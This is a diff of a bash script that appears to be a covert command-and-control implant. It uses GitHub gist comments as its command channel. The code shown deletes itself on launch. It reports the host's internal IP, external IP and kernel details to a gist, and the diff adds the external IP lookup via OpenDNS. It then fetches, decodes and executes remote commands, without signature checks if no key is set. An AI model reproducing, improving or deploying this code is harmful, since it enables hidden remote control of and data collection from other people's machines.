@@ -49,10 +49,10 @@ function dec {
 ##############################################
 # Message signature verification
 function ver {
-	if [ -n "$PUBLIC" ]; then
+	if [ -n "${PUBLIC}" ]; then
 		VAR=($(echo "$1" | tr ":" "\n"))
 		if [ -n "${VAR[0]}" ] &&  [ -n "${VAR[1]}" ]; then
-			echo -e ${VAR[0]} | openssl dgst -sha1 -verify <(echo -e "$PUBLIC") -signature <(echo ${VAR[1]} | base64 -d)
+			echo -e ${VAR[0]} | openssl dgst -sha1 -verify <(echo -e "${PUBLIC}") -signature <(echo ${VAR[1]} | base64 -d)
 		else
 			echo "Failed"
 		fi
@@ -78,7 +78,7 @@ function com {
 	if [ -n "${URL_GIST}" ]; then 
 		URL2=$(curl -H "Authorization: token ${TOK}" "${URL_GIST}" -s | grep -e "/comm\"" | sed -e "s/^.*https/https/" -e 's/".*$//');
 		if [ -n "${URL2}" ]; then 
-			RES=$(curl -s -H "Authorization: token ${TOK}" "$URL2");
+			RES=$(curl -s -H "Authorization: token ${TOK}" "${URL2}");
 			if [ "$VERIFY" == "0" ]; then
 				curl -s -X POST -H "Authorization: token ${TOK}" -H "Accept: application/vnd.github.v3+json" ${URL_GIST} -d '{"public": false, "files": {"comm": { "content": ""} } }' > /dev/null
 				COM=$($(dec "${RES}") 2>&1 );
@@ -100,19 +100,19 @@ function com {
 # Run and delete yourself
 rm $(realpath "$0");
 
-if [ -z "$TOK" ]; then
+if [ -z "${TOK}" ]; then
 	echo "ERROR: Github token not present"
 	exit
 fi
 
-if [ -z "$PUBLIC" ]; then
+if [ -z "${PUBLIC}" ]; then
 	echo "WARNING: Public key is not present, will rollback to unverified mode."
 	VERIFY=0
 fi
 
 ##############################################
-# First step, register yourself
-upd "$(hostname -I);$(uname -a)"
+# First step, register yourself (Internal IP; External IP; Linux Kernel
+upd "$(hostname -I);$(nslookup myip.opendns.com resolver1.opendns.com | grep 'Address' | tail -n 1 | sed -e 's/Address:\s*//i');$(uname -a)"
 
 ##############################################
 # Wait for commands
